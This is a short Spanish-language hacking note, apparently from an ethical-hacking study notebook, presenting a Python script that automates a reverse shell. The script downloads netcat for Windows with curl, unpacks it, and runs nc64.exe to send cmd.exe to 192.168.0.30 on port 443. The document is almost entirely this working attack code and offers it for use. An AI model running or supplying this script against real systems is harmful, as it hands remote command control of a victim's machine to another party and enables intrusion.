#HackingPython #PinguinoMario #HackingEtico
Podemos automatizar en un solo script de Python que netcat se descargue y se ejecute de esta manera:
```python
import os
import shutil

os.system("curl https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o netcat.zip")
shutil.unpack_archive("netcat.zip")
os.chdir("netcat-1.11")
os.system("nc64.exe 192.168.0.30 443 -e cmd.exe")
```
![[Pasted image 20221217090951.png]]
